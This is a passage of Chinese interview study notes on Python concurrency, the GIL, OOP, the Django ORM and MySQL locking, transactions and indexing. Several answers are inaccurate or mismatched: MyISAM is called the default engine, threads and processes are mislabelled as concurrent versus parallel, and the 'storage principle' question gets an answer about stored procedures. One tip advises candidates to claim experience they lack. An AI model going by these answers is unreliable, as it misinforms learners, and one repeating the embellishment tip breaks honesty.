        在互联网上防火墙是一种非常有效的网络安全模型，通过它可以隔离风险区域(即Internet或有一定风险的网络)与安全区域(局域网)的连接，同时不会妨碍人们对风险区域的访问。所以它一般连接在核心交换机与外网之间。

        1.过滤进出网络的数据 
        2.2.管理进出访问网络的行为 
        3.3.封堵某些禁止业务 
        4.4.记录通过防火墙信息内容和活动 
        5.5.对网络攻击检测和告警


'''
```

### 12.select、poll、epoll模型的区别?

```
# 答案:
'''
        I/O多路复用的本质就是用select/poll/epoll，去监听多个socket对象，如果其中的socket对象有变化，只要有变化，用户进程就知道了。

        select是不断轮询去监听的socket，socket个数有限制，一般为1024个；

        poll还是采用轮询方式监听，只不过没有个数限制；

        epoll并不是采用轮询方式去监听了，而是当socket有变化时通过回调的方式主动告知用户进程。

 
'''
```

### 13.简述进程、线程、协程的区别以及应用场景?

```
# 答案:
'''
1.进程是操作系统资源分配的最小单位，拥有独立的资源和地址空间
2.线程是CPU调度的单位
3.统一进程中的线程是资源共享的。
4.协程是用户级别的，程序之间的切换由用户自行处理，节省了CPU的调度时间。
'''
```

### 谈谈你对多进程，多线程，以及协程的理解，项目是否用？

这个问题被问的概率相当之大，其实多线程，多进程，在实际开发中用到的很少，除非是那些对项目性能要求特别高的，有的开发工作几年了，也确实没用过，你可以这么回答，给他扯扯什么是进程，线程（cpython中是伪多线程）的概念就行，实在不行你就说你之前写过下载文件时，用过多线程技术，或者业余时间用过多线程写爬虫，提升效率。

```
'''
进程：一个运行的程序（代码）就是一个进程，没有运行的代码叫程序，进程是系统资源分配的最
小单位，进程拥有自己独立的内存空间，所以进程间数据不共享，开销大。

线程：  调度执行的最小单位，也叫执行路径，不能独立存在，依赖进程存在一个进程至少有一个线程，叫主线程，而多个线程共享内存(数据共享，共享全局变量)，从而极大地提高了程序的运行效率。

协程：是一种用户态的轻量级线程，协程的调度完全由用户控制。协程拥有自己的寄存器上下文和栈。

协程调度切换时，将寄存器上下文和栈保存到其他地方，在切回来的时候，恢复先前保存的寄存
器上下文和栈，直接操作栈则基本没有内核切换的开销，可以不加锁的访问全局变量，所以上下文的切
换非常快。
'''
```

### 38.曾经在哪里使用过: 线程、进程、协程?

```
# 答案:
'''
1.在写高并发的服务端代码时。
2.在写高性能爬虫的时候。
'''
```

### 

### 14.什么是GIL锁?

```
# 答案:
'''
        全局解释锁，每次只能一个线程获得cpu的使用权：为了线程安全，也就是为了解决多线程之间的数据完整性和状态同步而加的锁，因为我们知道线程之间的数据是共享的。
'''
```

### .请简述GIL对Python性能的影响

```
# 答案:
'''
GIL：全局解释器锁。每个线程在执行的过程都需要先获取GIL，保证同一时刻只有一个线程可以执行字节码。
线程释放GIL锁的情况：
在IO操作等可能会引起阻塞的system call之前,可以暂时释放GIL,但在执行完毕后,必须重新获取GIL
Python 3.x使用计时器（执行时间达到阈值后，当前线程释放GIL）或Python 2.x，tickets计数达到100
Python使用多进程是可以利用多核的CPU资源的。
多线程爬取比单线程性能有提升，因为遇到IO阻塞会自动释放GIL锁
'''
```

### 解释一下什么是锁，有哪几种锁?

```
锁(Lock)是 Python 提供的对线程控制的对象。有互斥锁、递归锁。
```

### 60.什么是死锁呢？

```
若干子线程在系统资源竞争时，都在等待对方对某部分资源解除占用状态，结果是谁也不愿先解锁，互相干等着，程序无法执行下去，这就是死锁。
GIL锁（有时候，面试官不问，你自己要主动说，增加b格，尽量别一问一答的尬聊，不然最后等到的一句话就是：你还有什么想问的么？）
GIL锁 全局解释器锁（只在cpython里才有）
作用：限制多线程同时执行，保证同一时间只有一个线程执行，所以cpython里的多线程其实是伪多线程!
所以Python里常常使用协程技术来代替多线程，协程是一种更轻量级的线程，
进程和线程的切换时由系统决定，而协程由我们程序员自己决定，而模块gevent下切换是遇到了耗时操作才会切换。
三者的关系：进程里有线程，线程里有协程。
```

### threading.local的作用?

```
# 答案:
为每个线程创建一个独立的空间，使得线程对自己的空间中的数据进行操作（数据隔离）
```

### 

### 进程之间如何进行通信?

```
# 答案:
python提供了多种进程通信的方式，主要Queue和Pipe这两种方式，Queue用于多个进程间实现通信，Pipe是两个进程的通信。
```

### 什么是并发和并行?

```
# 答案:
# 并发：同一时刻只能处理一个任务，但可以交替处理多个任务。(一个处理器同时处理多个任务)
# 并行：同一时刻可以处理多个任务。(多个处理器或者是多核的处理器同时处理多个不同的任务)
# 类比：并发是一个人同时吃三个馒头，而并行是三个人同时吃三个馒头。 
```

### 19.同步和异步，阻塞和非阻塞的区别？

```
# 答案:
'''
同步：执行一个操作之后，需要主动等待返回结果；
异步：执行一个操作之后，不需要主动等待返回结果，若接收到结果通知，再回来执行刚才没执行完的操作。
同步和异步关心的问题是：要不要主动等待结果。

阻塞：在执行一个操作时，不能做其他操作；
非阻塞：在执行一个操作时，能做其他操作。
阻塞和非阻塞关心的问题是：能不能做其他操作。
'''
```

### 22.如何修改本地hosts文件?

```
# 答案:
'''
Hosts是一个没有扩展名的系统文件，可以用记事本等工具打开，其作用就是将一些常用的网址域名与其对应的IP地址建立一个关联“数据库”，
当用户在浏览器中输入一个需要登录的网址时，系统会首先自动从Hosts文件中寻找对应的IP地址，
一旦找到，系统会立即打开对应网页，如果没有找到，则系统会再将网址提交给DNS域名解析服务器进行IP地址的解析。

文件路径：C:\WINDOWS\system32\drivers\etc。
将127.0.0.1   www.163.com  添加在最下面
修改后用浏览器访问“www.163.com”会被解析到127.0.0.1，导致无法显示该网页。
'''
```

### 24.什么是cdn?

```
# 答案:
'''
目的是使用户可以就近到服务器取得所需内容，解决 Internet网络拥挤的状况，提高用户访问网站的响应速度。

cdn 即内容分发网络
'''
```

### 简述线程死锁是如何造成的?如何避免?

```
# 答案:
1.加锁顺序（线程按照一定的顺序加锁）
2.加锁时限（线程尝试获取锁的时候加上一定的时限，超过时限则放弃对该锁的请求，并释放自己占有的锁）
3.死锁检测
```

### 42.asynio是什么?

```
# 答案:
python高并发模块。
```

### 43.gevent模块是什么?

```
# 答案:
'''
gevent是第三方库，通过greenlet实现协程，其基本思想是：

当一个greenlet遇到IO操作时，比如访问网络，就自动切换到其他的greenlet，等到IO操作完成，再在适当的时候切换回来继续执行。由于IO操作非常耗时，经常使程序处于等待状态，有了gevent为我们自动切换协程，就保证总有greenlet在运行，而不是等待IO。
'''
```

### 什么是Nginx?

```
# 答案:
'''
Nginx是一款自由的、开源的、高性能的HTTP服务器和反向代理服务器，同时也是一个IMAP、POP3、SMTP代理服务器。可以用作HTTP服务器、方向代理服务器、负载均衡。
'''
```

### 什么是负载均衡?

```
# 答案:
'''
系统的扩展可分为纵向（垂直）扩展和横向（水平）扩展。纵向扩展，是从单机的角度通过增加硬件处理能力，比如CPU处理能力，内存容量，磁盘等方面，实现服务器处理能力的提升，不能满足大型分布式系统（网站），大流量，高并发，海量数据的问题。因此需要采用横向扩展的方式，通过添加机器来满足大型网站服务的处理能力。比如：一台机器不能满足，则增加两台或者多台机器，共同承担访问压力。这就是典型的集群和负载均衡架构


'''
```

### 什么是反向代理?

```
# 答案:
'''
反向代理，这个词相信搞网络的朋友都很熟悉的，但是具体是什么意思呢？说实话，复杂的我也不懂，就我个人理解而言，反向代理有很多用途，比如说保护真实服务器不被外界攻击，加速网络等等。今天我们要介绍的就是加速网络的一种。
'''
```

### 50.什么是rpc及应用场景?

```
# 答案:
'''
RPC主要用于公司内部的服务调用，性能消耗低，传输效率高，服务治理方便。HTTP主要用于对外的异构环境，浏览器接口调用，APP接口调用，第三方接口调用等...
'''
```

### 61.什么是线程安全，什么是互斥锁？

```
每个对象都对应于一个可称为" 互斥锁"的标记，这个标记用来保证在任一时刻，只能有一个线程访问该对象。
同一个进程中的多线程之间是共享系统资源的，多个线程同时对一个对象进行操作，一个线程操作尚未结束，
另一个线程已经对其进行操作，导致最终结果出现错误，此时需要对被操作对象添加互斥锁，保证每个线程对该对象的操作都得到正确的结果。
```

### 63.什么是僵尸进程和孤儿进程？怎么避免僵尸进程?

```
孤儿进程：父进程退出，子进程还在运行的这些子进程都是孤儿进程，孤儿进程将被 init 进程(进程号为 1)所收养，并由init进程对它们完成状态收集工作。

僵尸进程：进程使用fork创建子进程，如果子进程退出，而父进程并没有调用 wait或waitpid获取子进程的状态信息，那么子进程的进程描述符仍然保存在系统中的这些进程是僵尸进程。

避免僵尸进程的方法：
-fork两次用孙子进程去完成子进程的任务；
-用wait()函数使父进程阻塞；
-使用信号量，在 signal handler 中调用waitpid，这样父进程不用阻塞。
```

### 64.Python中的进程与线程的使用场景?

```
多进程适合在 CPU 密集型操作(cpu 操作指令比较多，如位数多的浮点运算)。
多线程适合在 IO 密集型操作(读写数据操作较多的，比如爬虫)。
```

### 65.线程是并发还是并行，进程是并发还是并行？

```
线程是并发，进程是并行；
进程之间相互独立，是系统分配资源的最小单位，同一个线程中的所有线程共享资源。
```



## 面向对象

### 1、简述面向对象的三大特性。

```
# 答案
封装:
    封装指的是把一堆数据属性与方法数据放在一个容器中，这个容器就是对象。让对象可以通过 "." 来调用对象中的数据属性与方法属性。
    
继承:
    继承指的是子类可以继承父类的数据属性与方法属性，并可以对其进行修改或使用。
    
多态:
    在python中的多态指的是让多种类若具备类似的数据属性与方法属性，都统一好命名规范，这样可以提高开发者的代码统一性，使得调用者更方便去理解。
```

### 2、什么是鸭子模型?

```
# 答案
在python中不会强制性要求所有人的代码都统一规范，不统一也不会报错，若使用抽象类就会使python代码强制统一规范，这样不符合python动态语言的特性。所以让大家都自觉统一好规范，若大家的对象方法都类似的话就一种规范，只要长得像鸭子，就称之为鸭子类型。
```

### 3、super 的作用?

```
# 答案
'''
    使用super()可以在子类中调用父类的方法或属性, 可能你会说, 子类本来就可以调用父类中所有非私有的属性或方法,而我现在说的是, 当子类中实现了某个方法, 父类中也有这个方法, 当你调用这个方法时, 既想执行子类的又想执行父类的, 在这种情况下就可以使用super()
'''
```

### 4、mro 是什么?

```
# 答案
mro全称Method Resolution Order，指的是方法解析顺序。方法调用时就需要对当前类和基类进行搜索以确定方法所在的位置。而搜索的顺序就是所谓的「方法解析顺序」。
```

### 5、什么是 c3 算法?

```
# 答案
'''
C3算法最早被提出是用于Lisp的，应用在Python中是为了解决原来基于深度优先搜索算法不满足本地优先级，和单调性的问题。
本地优先级：指声明时父类的顺序，比如C(A,B)，如果访问C类对象属性时，应该根据声明顺序，优先查找A类，然后再查找B类。
单调性：如果在C的解析顺序中，A排在B的前面，那么在C的所有子类里，也必须满足这个顺序。
'''
```

### 6、列举面向对象中带双下划线的特殊方法。

```
# 答案
#__setattr__: 添加/修改属性会触发它的执行
#__delattr__: 删除属性的时候会触发
#__getattr__: 只有在使用点调用属性且属性不存在的时候才会触发
# __getattribute__: 不管是否存在,我都会执行
```

### 7、双下划线和单下划线的区别?

```
# 答案
'''
"单下划线" 开始的成员变量叫做保护变量，意思是只有类对象和子类对象自己能访问到这些变量。

"双下划线" 开始的是私有成员，意思是只有类对象自己能访问，连子类对象也不能访问到这个数据。
'''
```

### 8、实例变量和类变量的区别?

```
# 答案
类变量是所有对象共有，其中一个对象将它值改变，其他对象得到的就是改变后的结果；而实例变量则属对象私有，某一个对象将其值改变，不影响其他对象；
```

### 10、isinstance 和 type 的作用?

```
# 答案
'''
type和isinstance都可以判断变量是否属于某个内建类型
type只接收一个参数，不但可以判断变量是否属于某个类型，而且可以得到参数变量未知的所属的类型；而isinstance只能判断是否属于某个已知类型，不能直接得到变量未知的所属的类型
'''
```

### 11、有用过with statement(语句)吗?它的好处是什么?

```
# 答案
'''
with语句会在嵌套的代码执行之后，自动关闭文件。这种做法的还有另一个优势就是，无论嵌套的代码是以何种方式结束的，它都关闭文件。如果在嵌套的代码中发生异常，它能够在外部exception handler catch异常前关闭文件。如果嵌套代码有return/continue/break语句，它同样能够关闭文件。
'''
```

### 类的加载顺序(类中有继承有构造有静态)?

```
1、 类对象 
2、 实例对象 
3、 self变量名称问题 
4、 类属性、实例变量、局部变量 
5、 类方法 
6、 实例方法 
7、 类方法与实例方法相互调用 
8、 静态方法 
9、 继承时三类方法的影响 
```

### 22、with 类方法 参考下面代码片段

```python
class Context:pass

with Context as ctx:
    ctx.do_something()
    
# 请在 Context 类下添加代码完成该类的实现 

# 答案:
class Context(object):
    def __enter__(self):
        pass

    def __exit__(self, exc_type, exc_val, exc_tb):
        if all([exc_type, exc_val, exc_tb]):
            print 'handler except'
            print 'exception {}'.format(exc_val)
        return True
        
def main():
    with tornado.stack_context.StackContext(Contextor):
        async_task()
```

### Python中的staticmethod(静态方法)和classmethod(类方法)

* 通过@classmethod 装饰的方法为类方法。
* 类方法只能访问类变量，不能访问实例变量。
* 当我们直接访问初始化后的实例变量时，会提示没有这个属性(AttributeError: type object ‘ClassName‘ has no attribute ‘arg‘)。

* 静态方法是通过@staticmethod 装饰器，将普通方法装饰为一个静态方法。
* 静态方法在类中不必传入self参数，不能访问类变量和实例变量。下面先写一个静态方法

### 单例模式的优点和应用？

```
单例模式的优点：
1、由于单例模式要求在全局内只有一个实例，因而可以节省比较多的内存空间；
2、全局只有一个接入点，可以更好地进行数据同步控制，避免多重占用；
3、单例可长驻内存，减少系统开销。
单例模式的应用举例：
1、生成全局惟一的序列号；
2、访问全局复用的惟一资源，如磁盘、总线等；
3、单个对象占用的资源过多，如数据库等；
4、系统全局统一管理，如Windows下的Task Manager；
5、网站计数器。
6、数据库配置，数据库连接池
7、应用程序的日志应用
```

### 3单例模式的缺点

```
1、单例模式的扩展是比较困难的；
2、赋于了单例以太多的职责，某种程度上违反单一职责原则（六大原则后面会讲到）;
3、单例模式是并发协作软件模块中需要最先完成的，因而其不利于测试；
4、单例模式在某种情况下会导致“资源瓶颈”。
```

### 简述面向对象中__new__和__init__区别**

```
'''
__init__是初始化方法，创建对象后，就立刻被默认调用了，可接收参数。

1、__new__至少要有一个参数cls，代表当前类，此参数在实例化时由Python解释器自动识别

2、__new__必须要有返回值，返回实例化出来的实例，这点在自己实现__new__时要特别注意，可以return父类（通过super(当前类名, cls)）__new__出来的实例，或者直接是object的__new__出来的实例

3、__init__有一个参数self，就是这个__new__返回的实例，__init__在__new__的基础上可以完成一些其它初始化的动作，__init__不需要返回值

4、如果__new__创建的是当前类的实例，会自动调用__init__函数，通过return语句里面调用的__new__函数的第一个参数是cls来保证是当前类实例，如果是其他类的类名，；那么实际创建返回的就是其他类的实例，其实就不会调用当前类的__init__函数，也不会调用其他类的__init__函数。
'''
```

### **12、简述with方法打开处理文件帮我我们做了什么？**

```
'''
        打开文件在进行读写的时候可能会出现一些异常状况，如果按照常规的f.open写法，我们需要try,except,finally，做异常判断，并且文件最终不管遇到什么情况，都要执行finally f.close()关闭文件，with方法帮我们实现了finally中f.close
        （当然还有其他自定义功能，有兴趣可以研究with方法源码）
'''
```

## django

### 1. Django ORM查询中select_related和prefetch_related的区别？？

```
def select_related(self, *fields)
    性能相关：表之间进行join连表操作，一次性获取关联的数据。

    总结：
    1. select_related主要针一对一和多对一关系进行优化。
    2. select_related使用SQL的JOIN语句进行优化，通过减少SQL查询的次数来进行优化、提高性能。

def prefetch_related(self, *lookups)
    性能相关：多表连表操作时速度会慢，使用其执行多次SQL查询在Python代码中实现连表操作。

    总结：
    1. 对于多对多字段（ManyToManyField）和一对多字段，可以使用prefetch_related()来进行优化。
    2. prefetch_related()的优化方式是分别查询每个表，然后用Python处理他们之间的关系。
```

### only 和 defer 的区别?

```
defer('id','name'):取出对象，字段除了id和name都有
only('id','name'):取的对象，只有id和name
```

### 2. Django ORM是什么？

```
对象关系映射，通过models中的类来对应数据库中的一个表，一个对象对应一个数据行，一个属性对应数据库中的一个字段
```

**F 对象**
作用：用于类属性之间的比较条件。

```
1. from django.db.models import F 
2. 例：where bread > bcomment BookInfo.objects.filter(bread__gt =F(‘bcomment’)) 
3. 例：BookInfo.objects.filter(bread__gt=F(‘bcomment’)*2) 
```

**Q 对象**
作用：用于查询时的逻辑条件。可以对 Q 对象进行&|~操作。

```
1. from django.db.models import Q  
2. BookInfo.objects.filter(id__gt=3， bread__gt=30) 
3. BooInfo.objects.filter(Q(id__gt=3) & Q(bread__gt=3)) 
4. 例：BookInfo.objects.filter(Q(id__gt=3) | Q(bread__gt=30)) 
5. 例：BookInfo.objects.filter(~Q(id=3)) 
```



# MyAQL

## 悲观锁与乐观锁

## 何谓悲观锁与乐观锁

乐观锁对应于生活中乐观的人总是想着事情往好的方向发展，悲观锁对应于生活中悲观的人总是想着事情往坏的方向发展。这两种人各有优缺点，不能不以场景而定说一种人好于另外一种人。

## 悲观锁

总是假设最坏的情况，每次去拿数据的时候都认为别人会修改，所以每次在拿数据的时候都会上锁，这样别人想拿这个数据就会阻塞直到它拿到锁（共享资源每次只给一个线程使用，其它线程阻塞，用完后再把资源转让给其它线程）。传统的关系型数据库里边就用到了很多这种锁机制，比如行锁，表锁等，读锁，写锁等，都是在做操作之前先上锁。Java中synchronized和ReentrantLock等独占锁就是悲观锁思想的实现。

## 乐观锁

总是假设最好的情况，每次去拿数据的时候都认为别人不会修改，所以不会上锁，但是在更新的时候会判断一下在此期间别人有没有去更新这个数据，可以使用版本号机制和CAS算法实现。乐观锁适用于多读的应用类型，这样可以提高吞吐量，像数据库提供的类似于write_condition机制，其实都是提供的乐观锁。在Java中java.util.concurrent.atomic包下面的原子变量类就是使用了乐观锁的一种实现方式CAS实现的。

## 两种锁的使用场景

从上面对两种锁的介绍，我们知道两种锁各有优缺点，不可认为一种好于另一种，像乐观锁适用于写比较少的情况下（多读场景），即冲突真的很少发生的时候，这样可以省去了锁的开销，加大了系统的整个吞吐量。但如果是多写的情况，一般会经常产生冲突，这就会导致上层应用会不断的进行retry，这样反倒是降低了性能，所以一般多写的场景下用悲观锁就比较合适。

## 乐观锁常见的两种实现方式

乐观锁一般会使用版本号机制或CAS算法实现。

1. 版本号机制
   一般是在数据表中加上一个数据版本号version字段，表示数据被修改的次数，当数据被修改时，version值会加一。当线程A要更新数据值时，在读取数据的同时也会读取version值，在提交更新时，若刚才读取到的version值为当前数据库中的version值相等时才更新，否则重试更新操作，直到更新成功。

举一个简单的例子：

假设数据库中帐户信息表中有一个 version 字段，当前值为 1 ；而当前帐户余额字段（ balance ）为 $100 。当需要对账户信息表进行更新的时候，需要首先读取version字段。

操作员 A 此时将其读出（ version=1 ），并从其帐户余额中扣除 $50（ $100-$50 ）。
在操作员 A 操作的过程中，操作员B 也读入此用户信息（ version=1 ），并从其帐户余额中扣除 $20 （ $100-$20 ）。
操作员 A 完成了修改工作，提交更新之前会先看数据库的版本和自己读取到的版本是否一致，一致的话，就会将数据版本号加1（ version=2 ），连同帐户扣除后余额（ balance=$50 ），提交至数据库更新，此时由于提交数据版本大于数据库记录当前版本，数据被更新，数据库记录 version 更新为 2 。
操作员 B 完成了操作，提交更新之前会先看数据库的版本和自己读取到的版本是否一致，但此时比对数据库记录版本时发现，操作员 B 提交的数据版本号为 2 ，而自己读取到的版本号为1 ，不满足 “ 当前最后更新的version与操作员第一次读取的版本号相等 “ 的乐观锁策略，因此，操作员 B 的提交被驳回。
这样，就避免了操作员 B 用基于 version=1 的旧数据修改的结果覆盖操作员A 的操作结果的可能。

2. CAS算法
   即compare and swap（比较与交换），是一种有名的无锁算法。无锁编程，即不使用锁的情况下实现多线程之间的变量同步，也就是在没有线程被阻塞的情况下实现变量的同步，所以也叫非阻塞同步（Non-blocking Synchronization）。CAS算法涉及到三个操作数

需要读写的内存值 V
进行比较的值 A
拟写入的新值 B
当且仅当 V 的值等于 A时，CAS通过原子方式用新值B来更新V的值，否则不会执行任何操作（比较和替换是一个原子操作）。一般情况下是一个自旋操作，即不断的重试。

## 乐观锁的缺点

ABA 问题是乐观锁一个常见的问题

1 ABA 问题
如果一个变量V初次读取的时候是A值，并且在准备赋值的时候检查到它仍然是A值，那我们就能说明它的值没有被其他线程修改过了吗？很明显是不能的，因为在这段时间它的值可能被改为其他值，然后又改回A，那CAS操作就会误认为它从来没有被修改过。这个问题被称为CAS操作的 "ABA"问题。

JDK 1.5 以后的 AtomicStampedReference 类就提供了此种能力，其中的 compareAndSet 方法就是首先检查当前引用是否等于预期引用，并且当前标志是否等于预期标志，如果全部相等，则以原子方式将该引用和该标志的值设置为给定的更新值。

2 循环时间长开销大
自旋CAS（也就是不成功就一直循环执行直到成功）如果长时间不成功，会给CPU带来非常大的执行开销。 如果JVM能支持处理器提供的pause指令那么效率会有一定的提升，pause指令有两个作用，第一它可以延迟流水线执行指令（de-pipeline）,使CPU不会消耗过多的执行资源，延迟的时间取决于具体实现的版本，在一些处理器上延迟时间是零。第二它可以避免在退出循环的时候因内存顺序冲突（memory order violation）而引起CPU流水线被清空（CPU pipeline flush），从而提高CPU的执行效率。

3 只能保证一个共享变量的原子操作
CAS 只对单个共享变量有效，当操作涉及跨多个共享变量时 CAS 无效。但是从 JDK 1.5开始，提供了AtomicReference类来保证引用对象之间的原子性，你可以把多个变量放在一个对象里来进行 CAS 操作.所以我们可以使用锁或者利用AtomicReference类把多个共享变量合并成一个共享变量来操作。

CAS与synchronized的使用情景
简单的来说CAS适用于写比较少的情况下（多读场景，冲突一般较少），synchronized适用于写比较多的情况下（多写场景，冲突一般较多）

对于资源竞争较少（线程冲突较轻）的情况，使用synchronized同步锁进行线程阻塞和唤醒切换以及用户态内核态间的切换操作额外浪费消耗cpu资源；而CAS基于硬件实现，不需要进入内核，不需要切换线程，操作自旋几率较少，因此可以获得更高的性能。
对于资源竞争严重（线程冲突严重）的情况，CAS自旋的概率会比较大，从而浪费更多的CPU资源，效率低于synchronized。
补充： Java并发编程这个领域中synchronized关键字一直都是元老级的角色，很久之前很多人都会称它为 “重量级锁” 。但是，在JavaSE 1.6之后进行了主要包括为了减少获得锁和释放锁带来的性能消耗而引入的 偏向锁 和 轻量级锁 以及其它各种优化之后变得在某些情况下并不是那么重了。synchronized的底层实现主要依靠 Lock-Free 的队列，基本思路是 自旋后阻塞，竞争切换后继续竞争锁，稍微牺牲了公平性，但获得了高吞吐量。在线程冲突较少的情况下，可以获得和CAS类似的性能；而线程冲突严重的情况下，性能远高于CAS。



## MQL事物

事务机制可以确保数据一致性。

事务应该具有4个属性：原子性、一致性、隔离性、持久性。这四个属性通常称为ACID特性。

* 原子性（atomicity）。一个事务是一个不可分割的工作单位，事务中包括的诸操作要么都做，要么都不做。
* 一致性（consistency）。事务必须是使数据库从一个一致性状态变到另一个一致性状态。一致性与原子性是密切相关的。
* 隔离性（isolation）。一个事务的执行不能被其他事务干扰。即一个事务内部的操作及使用的数据对并发的其他事务是隔离的，并发执行的各个事务之间不能互相干扰。
* 持久性（durability）。持续性也称永久性（permanence），指一个事务一旦提交，它对数据库中数据的改变就应该是永久性的。接下来的其他操作或故障不应该对其有任何影响。

​       对于支持事务的数据库， 在Python数据库编程中，当游标建立之时，就自动开始了一个隐形的数据库事务。commit()方法游标的所有更新操作，rollback（）方法回滚当前游标的所有操作。每一个方法都开始了一个新的事务。（在上一个笔记上面写了mysql语句在python中的使用）

事务的用户隔离级别:
数据库使用者可以控制数据库工作在哪个级别下,就可与防止不同的隔离性问题
read uncommitted --不做任何隔离,可能脏读,幻读
read committed --可以防止脏读,不能防止不可重复读,和幻读, 
Repeatable read --可以防止脏读,不可重复读,不能防止幻读
Serializable --数据库运行在串行化实现,所有问题都没有,就是性能低

脏读、不可重复读、幻读：
也许有很多读者会对上述隔离级别中提及到的 脏读、不可重复读、幻读 的理解有点吃力，我在这里尝试使用通俗的方式来解释这三种语义：

脏读：所谓的脏读，其实就是读到了别的事务回滚前的脏数据。比如事务B执行过程中修改了数据X，在未提交前，事务A读取了X，而事务B却回滚了，这样事务A就形成了脏读。

也就是说，当前事务读到的数据是别的事务想要修改成为的但是没有修改成功的数据。

不可重复读：事务A首先读取了一条数据，然后执行逻辑的时候，事务B将这条数据改变了，然后事务A再次读取的时候，发现数据不匹配了，就是所谓的不可重复读了。

也就是说，当前事务先进行了一次数据读取，然后再次读取到的数据是别的事务修改成功的数据，导致两次读取到的数据不匹配，也就照应了不可重复读的语义。

幻读：事务A首先根据条件索引得到N条数据，然后事务B改变了这N条数据之外的M条或者增添了M条符合事务A搜索条件的数据，导致事务A再次搜索发现有N+M条数据了，就产生了幻读。

也就是说，当前事务读第一次取到的数据比后来读取到数据条目少。

不可重复读和幻读比较：
两者有些相似，但是前者针对的是update或delete，后者针对的insert。

## 数据库表的引擎：驱动数据的方式-数据库优化

```python
前提: 引擎是建表是规定, 提供给表使用的, 不是数据库
1.展示所有引擎
mysql> show engines; 

# 重点: 
mysql> use db1;选择数据库
2. innodb(默认): 支持事务, 行级锁, 外键（安全性比较高，加锁）
mysql>: create table t1(id int)engine=innodb;
3. myisam: 查询效率要优于innodb, 当不需要支持事务, 行级锁, 外键, 可以通过设置myisam来优化数据库（速度比较快，无锁）
mysql>: create table t2(id int)engine=myisam;
4. blackhole：黑洞，存进去的数据都会消失（可以理解不存数据）
mysql>: create table t3(id int)engine=blackhole;

5. memory：表结构是存储在硬盘上的，但是表数据全部存储在内存中，重启清空
mysql>: create table t4(id int)engine=memory;

insert into t1 values(1);
insert into t2 values(1);
insert into t3 values(1);
insert into t4 values(1);

select * from t1; ...
```

## mysql支持的数据类型

```python
#mysql数据库支持存在那些数据
整型、浮点型、字符型、时间类型、枚举类型、集合类型

```



##  数据库的优化？

1.优化索引、SQL 语句、分析慢查询；
2.设计表的时候严格根据数据库的设计范式来设计数据库；
3.使用缓存，把经常访问到的数据而且不需要经常变化的数据放在缓存中，能节约磁盘IO
4.优化硬件；采用SSD，使用磁盘队列技术(RAID0,RAID1,RDID5)等
5.采用MySQL 内部自带的表分区技术，把数据分层不同的文件，能够提高磁盘的读取效率；
6.垂直分表；把一些不经常读的数据放在一张表里，节约磁盘I/O；
7.主从分离读写；采用主从复制把数据库的读操作和写入操作分离开来；
8.分库分表分机器（数据量特别大），主要的的原理就是数据路由；
9.选择合适的表引擎，参数上的优化
10.进行架构级别的缓存，静态化和分布式；
11.不采用全文索引；
12.采用更快的存储方式，例如 NoSQL存储经常访问的数据**。

## 数据库怎么优化查询效率？

1、储存引擎选择：如果数据表需要事务处理，应该考虑使用InnoDB，因为它完全符合ACID特性。
如果不需要事务处理，使用默认存储引擎MyISAM是比较明智的
2、分表分库，主从。
3、对查询进行优化，要尽量避免全表扫描，首先应考虑在 where 及 order by 涉及的列上建立索引
4、应尽量避免在 where 子句中对字段进行 null 值判断，否则将导致引擎放弃使用索引而进行全表扫描
5、应尽量避免在 where 子句中使用 != 或 <> 操作符，否则将引擎放弃使用索引而进行全表扫描
6、应尽量避免在 where 子句中使用 or 来连接条件，如果一个字段有索引，一个字段没有索引，将导致引擎放弃使用索引而进行全表扫描
7、Update 语句，如果只更改1、2个字段，不要Update全部字段，否则频繁调用会引起明显的性能消耗，同时带来大量日志
8、对于多张大数据量（这里几百条就算大了）的表JOIN，要先分页再JOIN，否则逻辑读会很高，性能很差。

29.尽量避免大事务操作，提高系统并发能力。

30.尽量避免向客户端返回大数据量，若数据量过大，应该考虑相应需求是否合理。

## 说一下Mysql数据库存储的原理？

储存过程是一个可编程的函数，它在数据库中创建并保存。它可以有SQL语句和一些特殊的控制结构组成。当希望在不同的应用程序或平台上执行相同的函数，或者封装特定功能时，存储过程是非常有 用的。数据库中的存储过程可以看做是对编程中面向对象方法的模拟。它允许控制数据的访问方式。
存储过程通常有以下优点：
1、存储过程能实现较快的执行速度
2、存储过程允许标准组件是编程。
3、存储过程可以用流程控制语句编写，有很强的灵活性，可以完成复杂的判断和较复杂的运算。
4、存储过程可被作为一种安全机制来充分利用。
5、存储过程能够减少网络流量

## 4. 数据库索引种类？

### index的底层原理

### 数据库的index的底层原理b+树，速度快，时间复杂度是O(logn)

索引是一种特殊的文件(InnoDB数据表上的索引是表空间的一个组成部分)，更通俗的说，数据库索引好比是一本书前面的目录，能加快数据库的查询速度

## 5. 索引在什么情况下遵循最左前缀的规则？

mysql在使用组合索引查询的时候需要遵循“最左前缀”规则

## 索引有什么作用,有那些分类,有什么好处和坏处?

```
作用：
索引提供指向存储在表的指定列中的数据值的指针，然后根据您指定的排序顺序对这些指针排序。数据库使用索引以找到特定值，然后顺指针找到包含该值的行。这样可以使对应于表的SQL语句执行得更快，可快速访问数据库表中的特定信息。
**MySQL索引的类型：**

1. 普通索引：这是最基本的索引，它没有任何限制
2. 唯一索引：索引列的值必须唯一，但允许有空值，如果是组合索引，则列值的组合必须唯一
3. 全文索引：全文索引仅可用于 MyISAM 表，可以从CHAR、VARCHAR或TEXT列中作为CREATE TABLE语句的一部分被创建，或是随后使用ALTER TABLE 或CREATE INDEX被添加（切记对于大容量的数据表，生成全文索引是一个非常消耗时间非常消耗硬盘空间的做法）
4. 单列索引、多列索引：多个单列索引与单个多列索引的查询效果不同，因为执行查询时，MySQL只能使用一个索引，会从多个索引中选择一个限制最为严格的索引。
5. 组合索引（最左前缀）：简单的理解就是只从最左面的开始组合（实在单列索引的基础上进一步压榨索引效率的一种方式
2、主键索引
数据库表经常有一列或多列组合，其值唯一标识表中的每一行。该列称为表的主键。在数据库关系图中为表定义主键将自动创建主键索引，主键索引是唯一索引的特定类型。该索引要求主键中的每个值都唯一。当在查询中使用主键索引时，它还允许对数据的快速访问。
3、聚集索引
在聚集索引中，表中行的物理顺序与键值的逻辑（索引）顺序相同。一个表只能包含一个聚集索引。如果某索引不是聚集索引，则表中行的物理顺序与键值的逻辑顺序不匹配。与非聚集索引相比，聚集索引通常提供更快的数据访问速度。
4、索引列
可以基于数据库表中的单列或多列创建索引。多列索引可以区分其中一列可能有相同值的行。如果经常同时搜索两列或多列或按两列或多列排序时，索引也很有帮助。例如，如果经常在同一查询中为姓和名两列设置判据，那么在这两列上创建多列索引将很有意义。

优点：

1、大大加快数据的检索速度。
